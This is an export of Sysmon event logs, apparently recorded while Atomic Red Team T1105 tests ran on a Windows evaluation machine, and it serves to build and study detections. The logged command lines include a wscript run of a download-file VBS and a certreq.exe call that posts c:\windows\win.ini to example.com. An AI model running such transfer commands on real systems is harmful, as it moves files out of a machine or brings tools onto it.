Microsoft-Windows-Sysmon/Operational,"wscript.exe  ""C:\AtomicRedTeam\atomics\T1105\src\T1105-download-file.vbs""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Microsoft ® Windows Based Script Host,1,19658,5.812.10240.16384,"MD5=CD3C1773CEF2611325FA884926090538,SHA256=7478B567C9EC9A1E1061F9C6DB2993FCDC2EC4E8FB5CA6DA80FA307B54116E69,IMPHASH=ACD7356FA52D4E2866A873BF9AB94256",C:\Windows\System32\wscript.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:31.527

ProcessGuid: {f57bd86a-8d63-658c-1802-000000000f00}

ProcessId: 10048

Image: C:\Windows\System32\wscript.exe

FileVersion: 5.812.10240.16384

Description: Microsoft ® Windows Based Script Host

Product: Microsoft ® Windows Script Host

Company: Microsoft Corporation

OriginalFileName: wscript.exe

CommandLine: wscript.exe  ""C:\AtomicRedTeam\atomics\T1105\src\T1105-download-file.vbs""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CD3C1773CEF2611325FA884926090538,SHA256=7478B567C9EC9A1E1061F9C6DB2993FCDC2EC4E8FB5CA6DA80FA307B54116E69,IMPHASH=ACD7356FA52D4E2866A873BF9AB94256

ParentProcessGuid: {f57bd86a-8d63-658c-1602-000000000f00}

ParentProcessId: 5652

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c wscript.exe ""C:\AtomicRedTeam\atomics\T1105\src\T1105-download-file.vbs""

ParentUser: WINDEV2309EVAL\User",Info,wscript.exe,"""cmd.exe"" /c wscript.exe ""C:\AtomicRedTeam\atomics\T1105\src\T1105-download-file.vbs""",C:\Windows\System32\cmd.exe,{f57bd86a-8d63-658c-1602-000000000f00},5652,WINDEV2309EVAL\User,,{f57bd86a-8d63-658c-1802-000000000f00},3588,10048,Microsoft ® Windows Script Host,,,,"
      ",-,2023-12-27T20:47:31.5309268Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:31.527,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:31.5309268Z""/>
      <EventRecordID>19658</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:31.527</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d63-658c-1802-000000000f00}</Data>
      <Data Name=""ProcessId"">10048</Data>
      <Data Name=""Image"">C:\Windows\System32\wscript.exe</Data>
      <Data Name=""FileVersion"">5.812.10240.16384</Data>
      <Data Name=""Description"">Microsoft &#174; Windows Based Script Host</Data>
      <Data Name=""Product"">Microsoft &#174; Windows Script Host</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">wscript.exe</Data>
      <Data Name=""CommandLine"">wscript.exe  ""C:\AtomicRedTeam\atomics\T1105\src\T1105-download-file.vbs""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=CD3C1773CEF2611325FA884926090538,SHA256=7478B567C9EC9A1E1061F9C6DB2993FCDC2EC4E8FB5CA6DA80FA307B54116E69,IMPHASH=ACD7356FA52D4E2866A873BF9AB94256</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8d63-658c-1602-000000000f00}</Data>
      <Data Name=""ParentProcessId"">5652</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c wscript.exe ""C:\AtomicRedTeam\atomics\T1105\src\T1105-download-file.vbs""</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:31.527

ProcessGuid: {f57bd86a-8d63-658c-1802-000000000f00}

ProcessId: 10048

Image: C:\Windows\System32\wscript.exe

FileVersion: 5.812.10240.16384

Description: Microsoft &#174; Windows Based Script Host

Product: Microsoft &#174; Windows Script Host

Company: Microsoft Corporation

OriginalFileName: wscript.exe

CommandLine: wscript.exe  ""C:\AtomicRedTeam\atomics\T1105\src\T1105-download-file.vbs""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=CD3C1773CEF2611325FA884926090538,SHA256=7478B567C9EC9A1E1061F9C6DB2993FCDC2EC4E8FB5CA6DA80FA307B54116E69,IMPHASH=ACD7356FA52D4E2866A873BF9AB94256

ParentProcessGuid: {f57bd86a-8d63-658c-1602-000000000f00}

ParentProcessId: 5652

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c wscript.exe ""C:\AtomicRedTeam\atomics\T1105\src\T1105-download-file.vbs""

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c wscript.exe ""C:\AtomicRedTeam\atomics\T1105\src\T1105-download-file.vbs""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,1,19657,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:31.498

ProcessGuid: {f57bd86a-8d63-658c-1602-000000000f00}

ProcessId: 5652

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c wscript.exe ""C:\AtomicRedTeam\atomics\T1105\src\T1105-download-file.vbs""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,,{f57bd86a-8d63-658c-1602-000000000f00},3588,5652,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:31.4999370Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:31.498,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:31.4999370Z""/>
      <EventRecordID>19657</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:31.498</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d63-658c-1602-000000000f00}</Data>
      <Data Name=""ProcessId"">5652</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c wscript.exe ""C:\AtomicRedTeam\atomics\T1105\src\T1105-download-file.vbs""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:31.498

ProcessGuid: {f57bd86a-8d63-658c-1602-000000000f00}

ProcessId: 5652

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c wscript.exe ""C:\AtomicRedTeam\atomics\T1105\src\T1105-download-file.vbs""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:47:11.803,,,2,19656,,,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23110.3-0\MsMpEng.exe,,0x8000000000000000,Information,,,"File creation time changed:

RuleName: T1099

UtcTime: 2023-12-27 20:47:31.097

ProcessGuid: {f57bd86a-36f8-658c-4a00-000000000f00}

ProcessId: 3552

Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23110.3-0\MsMpEng.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\T1105\file.exe

CreationUtcTime: 2023-12-27 20:47:11.803

PreviousCreationUtcTime: 2023-12-27 20:47:11.803

User: NT AUTHORITY\SYSTEM",Info,,,,,,,2023-12-27 20:47:11.803,{f57bd86a-36f8-658c-4a00-000000000f00},3588,3552,,,,,"
      ",T1099,2023-12-27T20:47:31.1095368Z,C:\Users\User\AppData\Local\Temp\T1105\file.exe,File creation time changed (rule: FileCreateTime),,5124,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-27 20:47:31.097,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>2</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>2</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:31.1095368Z""/>
      <EventRecordID>19656</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">T1099</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:31.097</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-36f8-658c-4a00-000000000f00}</Data>
      <Data Name=""ProcessId"">3552</Data>
      <Data Name=""Image"">C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23110.3-0\MsMpEng.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\T1105\file.exe</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:47:11.803</Data>
      <Data Name=""PreviousCreationUtcTime"">2023-12-27 20:47:11.803</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File creation time changed:

RuleName: T1099

UtcTime: 2023-12-27 20:47:31.097

ProcessGuid: {f57bd86a-36f8-658c-4a00-000000000f00}

ProcessId: 3552

Image: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23110.3-0\MsMpEng.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\T1105\file.exe

CreationUtcTime: 2023-12-27 20:47:11.803

PreviousCreationUtcTime: 2023-12-27 20:47:11.803

User: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>File creation time changed (rule: FileCreateTime)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,22,19655,,,C:\Windows\system32\certreq.exe,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:54:32.388

ProcessGuid: {f57bd86a-8d5d-658c-1502-000000000f00}

ProcessId: 3264

QueryName: example.com

QueryStatus: 0

QueryResults: ::ffff:93.184.216.34;

Image: C:\Windows\system32\certreq.exe

User: WINDEV2309EVAL\User",Info,,,,,,,,{f57bd86a-8d5d-658c-1502-000000000f00},3588,3264,,example.com,::ffff:93.184.216.34;,0,"
      ",-,2023-12-27T20:47:27.4932114Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:54:32.388,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:27.4932114Z""/>
      <EventRecordID>19655</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:54:32.388</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d5d-658c-1502-000000000f00}</Data>
      <Data Name=""ProcessId"">3264</Data>
      <Data Name=""QueryName"">example.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:93.184.216.34;</Data>
      <Data Name=""Image"">C:\Windows\system32\certreq.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:54:32.388

ProcessGuid: {f57bd86a-8d5d-658c-1502-000000000f00}

ProcessId: 3264

QueryName: example.com

QueryStatus: 0

QueryResults: ::ffff:93.184.216.34;

Image: C:\Windows\system32\certreq.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,certreq.exe  -Post -config https://example.com c:\windows\win.ini C:\Users\User\AppData\Local\Temp\Atomic-license.txt,Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,CertReq.exe,1,19654,10.0.22621.2506 (WinBuild.160101.0800),"MD5=C665264E47391B4D763ECD3111B1052E,SHA256=07480DC8CAD237515BCEA89F8566E58EA360B57B20AD025E8AEA83EC24106AC1,IMPHASH=6A0F86AA44F988073C05E0EE40F2BD02",C:\Windows\System32\certreq.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:25.385

ProcessGuid: {f57bd86a-8d5d-658c-1502-000000000f00}

ProcessId: 3264

Image: C:\Windows\System32\certreq.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: CertReq.exe

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: CertReq.exe

CommandLine: certreq.exe  -Post -config https://example.com c:\windows\win.ini C:\Users\User\AppData\Local\Temp\Atomic-license.txt

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C665264E47391B4D763ECD3111B1052E,SHA256=07480DC8CAD237515BCEA89F8566E58EA360B57B20AD025E8AEA83EC24106AC1,IMPHASH=6A0F86AA44F988073C05E0EE40F2BD02

ParentProcessGuid: {f57bd86a-8d5d-658c-1302-000000000f00}

ParentProcessId: 10936

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c certreq.exe -Post -config https://example.com c:\windows\win.ini %temp%\Atomic-license.txt

ParentUser: WINDEV2309EVAL\User",Info,CertReq.exe,"""cmd.exe"" /c certreq.exe -Post -config https://example.com c:\windows\win.ini %temp%\Atomic-license.txt",C:\Windows\System32\cmd.exe,{f57bd86a-8d5d-658c-1302-000000000f00},10936,WINDEV2309EVAL\User,,{f57bd86a-8d5d-658c-1502-000000000f00},3588,3264,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:25.3929644Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:25.385,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:25.3929644Z""/>
      <EventRecordID>19654</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:25.385</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d5d-658c-1502-000000000f00}</Data>
      <Data Name=""ProcessId"">3264</Data>
      <Data Name=""Image"">C:\Windows\System32\certreq.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">CertReq.exe</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">CertReq.exe</Data>
      <Data Name=""CommandLine"">certreq.exe  -Post -config https://example.com c:\windows\win.ini C:\Users\User\AppData\Local\Temp\Atomic-license.txt</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=C665264E47391B4D763ECD3111B1052E,SHA256=07480DC8CAD237515BCEA89F8566E58EA360B57B20AD025E8AEA83EC24106AC1,IMPHASH=6A0F86AA44F988073C05E0EE40F2BD02</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8d5d-658c-1302-000000000f00}</Data>
      <Data Name=""ParentProcessId"">10936</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">""cmd.exe"" /c certreq.exe -Post -config https://example.com c:\windows\win.ini %temp%\Atomic-license.txt</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:25.385

ProcessGuid: {f57bd86a-8d5d-658c-1502-000000000f00}

ProcessId: 3264

Image: C:\Windows\System32\certreq.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: CertReq.exe

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: CertReq.exe

CommandLine: certreq.exe  -Post -config https://example.com c:\windows\win.ini C:\Users\User\AppData\Local\Temp\Atomic-license.txt

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=C665264E47391B4D763ECD3111B1052E,SHA256=07480DC8CAD237515BCEA89F8566E58EA360B57B20AD025E8AEA83EC24106AC1,IMPHASH=6A0F86AA44F988073C05E0EE40F2BD02

ParentProcessGuid: {f57bd86a-8d5d-658c-1302-000000000f00}

ParentProcessId: 10936

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: ""cmd.exe"" /c certreq.exe -Post -config https://example.com c:\windows\win.ini %temp%\Atomic-license.txt

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c certreq.exe -Post -config https://example.com c:\windows\win.ini %%temp%%\Atomic-license.txt",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,1,19653,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:25.330

ProcessGuid: {f57bd86a-8d5d-658c-1302-000000000f00}

ProcessId: 10936

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c certreq.exe -Post -config https://example.com c:\windows\win.ini %%temp%%\Atomic-license.txt

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,,{f57bd86a-8d5d-658c-1302-000000000f00},3588,10936,Microsoft® Windows® Operating System,,,,"
      ",-,2023-12-27T20:47:25.3324022Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:47:25.330,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:47:25.3324022Z""/>
      <EventRecordID>19653</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:47:25.330</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8d5d-658c-1302-000000000f00}</Data>
      <Data Name=""ProcessId"">10936</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c certreq.exe -Post -config https://example.com c:\windows\win.ini %%temp%%\Atomic-license.txt</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:47:25.330

ProcessGuid: {f57bd86a-8d5d-658c-1302-000000000f00}

ProcessId: 10936

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c certreq.exe -Post -config https://example.com c:\windows\win.ini %%temp%%\Atomic-license.txt

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

